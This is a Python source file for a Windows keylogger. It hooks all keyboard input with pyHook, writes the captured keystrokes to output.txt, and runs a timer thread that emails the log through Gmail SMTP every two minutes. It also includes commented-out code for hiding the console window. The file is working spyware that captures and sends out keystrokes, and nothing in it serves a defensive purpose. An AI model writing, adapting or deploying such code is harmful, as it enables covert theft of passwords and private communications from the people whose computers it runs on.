import win32api
import win32console
import win32gui
import pythoncom, pyHook
import processing as p
from pyHook.HookManager import HookConstants
import smtplib, ssl
from email.message import EmailMessage
import threading
import datetime


CONTEXT = ssl.create_default_context()
SERVER = "smtp.gmail.com"
PORT = 587
USER="my97testac@gmail.com"
PASS="XXX"
FROM = USER
TO = ["my97testac@gmail.com"]

'''
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0) //3 for max size
# https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
# http://pyhook.sourceforge.net/doc_1.5.0/pyhook.HookManager.KeyboardEvent-class.html
# http://www.asciitable.com/
'''

def OnKeyboardEvent(event):
    data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt, event.KeyID)
    print(event.KeyID)  

    # open output.txt to read current keystrokes
    f = open('output.txt', 'r+')
    buffer = f.read()
    f.close()

    # do the flitering here
    keylogs_ID = event.KeyID
    buffer += p.verify(keylogs_ID)

    # open output.txt to write current + new keystrokes
    f = open('output.txt', 'w')
    f.write(buffer)
    f.close()
    return 0


class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
        self.filename = "output.txt"
    
    def run(self): # overload the function for threading
        while not self.event.is_set(): # while flag is false
            with open(self.filename, 'rt') as fp:
                # Create a text/plain message
                msg = EmailMessage()
                msg.set_content(fp.read())
            ts = datetime.datetime.now().isoformat(timespec='seconds') 
            msg['Subject'] = f'The contents of {self.filename} , at {ts}'
            msg['From'] = FROM
            msg['To'] = ", ".join(TO)
            
            try:
                server = smtplib.SMTP(SERVER)
                server.connect(SERVER,PORT)
                server.starttls(context=CONTEXT)
                server.login(USER,PASS)
                server.sendmail(FROM, TO, msg.as_string())
                print("Successfully sent email")
                server.quit()
            except Exception as e:
                print (e)

            self.event.wait(120) # blocking for 120 seconds before checking the flag status again

if __name__ == '__main__':
    # start email thread at 120s interval
    email=TimerClass()
    email.start()
    # create a hook manager object
    hm = pyHook.HookManager()
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()


'''
    print 'MessageName:',event.MessageName
    print 'Message:',event.Message
    print 'Time:',event.Time
    print 'Window:',event.Window
    print 'WindowName:',event.WindowName
    print 'Ascii:', event.Ascii, chr(event.Ascii)
    print 'Key:', event.Key
    print 'KeyID:', event.KeyID
    print 'ScanCode:', event.ScanCode
    print 'Extended:', event.Extended
    print 'Injected:', event.Injected
    print 'Alt', event.Alt
    print 'Transition', event.Transition
    print '---'
'''

''' # Possible to check for specific controls
def OnKeyboardEvent(event):
    ctrl_pressed = HookManager.GetKeyState(HookConstants.VKeyToID('VK_CONTROL'))
    if ctrl_pressed and HookConstant.IDToName(event.keyId) == 'c': 
        # process ctrl-c

    shift_pressed = pyHook.GetKeyState(HookConstants.VKeyToID('VK_LSHIFT'))
    print(shift_pressed)
'''